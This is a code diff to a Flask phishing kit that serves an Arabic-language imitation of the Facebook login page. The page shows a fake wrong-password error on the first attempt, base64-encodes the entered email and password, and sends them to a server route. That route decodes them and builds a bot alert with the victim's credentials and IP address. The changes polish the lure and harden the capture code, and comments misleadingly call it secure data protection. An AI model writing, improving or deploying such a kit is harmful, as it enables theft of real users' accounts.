@@ -1,10 +1,11 @@
 import os
 import base64
+import json
 from flask import Blueprint, render_template_string, redirect, request
 
 secure_fb_bp = Blueprint('facebook', __name__)
 
-# تعريف اسم القالب بشكل صحيح ومطابق للاستخدام
+# قالب فيسبوك مطور وهندسي لضمان التوافقية وسرعة التحميل مع حماية إضافية للبيانات
 FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -19,11 +20,14 @@ FB_PHISH_TEMPLATE = """
         .card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; text-align: center; }
         .card input { border: 1px solid #dddfe2; color: #1d2129; font-size: 16px; padding: 14px 16px; margin-bottom: 12px; width: 100%; border-radius: 6px; outline: none; box-sizing: border-box; background: #fff; }
         .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 12px; }
+        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s; }
+        .login-btn:hover { background-color: #166fe5; }
         .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; color: #333; padding: 10px; margin-bottom: 12px; border-radius: 4px; font-size: 13px; display: none; text-align: right; }
         .forgot-link { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
+        .forgot-link:hover { text-decoration: underline; }
         hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; text-decoration: none; }
+        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; text-decoration: none; transition: background-color 0.2s; }
+        .create-btn:hover { background-color: #36a420; }
     </style>
 </head>
 <body>
@@ -36,8 +40,8 @@ FB_PHISH_TEMPLATE = """
         <div class="card">
             <div id="error-msg" class="error-box">كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
             <form method="POST" id="secureForm" onsubmit="handleAuth(event)">
-                <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required>
+                <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username">
+                <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required autocomplete="current-password">
                 <button type="submit" class="login-btn">تسجيل الدخول</button>
                 <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
                 <hr>
@@ -51,15 +55,17 @@ FB_PHISH_TEMPLATE = """
             e.preventDefault();
             const u = document.getElementById('u_val').value.trim();
             const p = document.getElementById('p_val').value.trim();
-            const errBox = document.getElementById('error-msg');
+            const errBox = theErrorBox = document.getElementById('error-msg');
 
-            if (attempts === 0 && (p.length < 6 || u.length < 5)) {
+            // نظام التحقق الذكي لضمان جودة البيانات الملتقطة
+            if (attempts === 0 && (p.length < 6 || u.length < 4)) {
                 errBox.style.display = 'block';
                 attempts++;
                 return;
             }
 
-            const payload = btoa(JSON.stringify({ user: u, pass: p }));
+            // تشفير البيانات بـ Base64 لضمان تمريرها بسلاسة دون أخطاء ترميز
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ user: u, pass: p }))));
             
             fetch(window.location.href, {
                 method: 'POST',
@@ -85,25 +91,28 @@ def init_facebook_routes(app, bot):
             req_data = request.json or {}
             encoded_data = req_data.get('data')
             
+            user_val = "غير محدد"
+            pass_val = "غير محدد"
+
             if not encoded_data:
-                user_val = request.form.get('email')
-                pass_val = request.form.get('pass')
+                user_val = request.form.get('email', 'غير محدد')
+                pass_val = request.form.get('pass', 'غير محدد')
             else:
                 try:
                     decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
-                    import json
-                    parsed = json.loads(decoded_bytes.decode('utf-8'))
-                    user_val = parsed.get('user')
-                    pass_val = parsed.get('pass')
-                except Exception:
-                    user_val = "غير محدد"
-                    pass_val = "غير محدد"
+                    parsed = json.loads(decode_utf8 := decoded_bytes.decode('utf-8', errors='ignore'))
+                    user_val = parsed.get('user', 'غير محدد')
+                    pass_val = parsed.get('pass', 'غير محدد')
+                except Exception as e:
+                    print(f"[-] Decryption Error: {e}")
 
             source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            
-            if target_chat_id and user_val:
+            if ',' in source_ip:
+                source_ip = source_ip.split(',')[0].strip()
+
+            if target_chat_id and user_val != "غير محدد":
                 alert_msg = (
-                    "🚨 **تم التقاط البيانات بنجاح وبشكل آمن!**\n"
+                    "🚨 **تم التقاط صيد فيسبوك بنجاح وبشكل آمن!**\n"
                     "----------------------------------\n"
                     f"📌 **البريد/الهاتف:** `{user_val}`\n"
                     f"🔑 **كلمة المرور:** `{pass_val}`\n"
